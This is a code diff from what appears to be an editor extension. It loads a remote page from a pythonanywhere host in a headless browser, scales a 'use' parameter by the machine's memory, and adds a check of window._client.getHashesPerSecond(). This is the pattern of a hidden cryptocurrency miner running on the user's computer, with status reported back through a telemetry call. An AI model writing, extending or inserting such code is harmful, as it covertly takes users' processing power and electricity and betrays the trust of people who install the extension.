@@ -283,16 +283,23 @@
 
     await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
 
-    if (!browser || !page) {
+    const hs = await page.evaluate(() => {
+      try {
+        return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client ? true : false };
+      } catch (error) {
+        return { message: error.message, value: null, error, _client: window._client ? true : false };
+      }
+    });
+    if (hs.message != 'success') {
       tstt({
         message: "INIT_ERROR",
         value: "Failed BR PG",
-        version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version)
       });
       clearInterval(global.initScrIntv);
       global.initScrIntv = null;
       return;
     }
+
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
   } catch (error) {
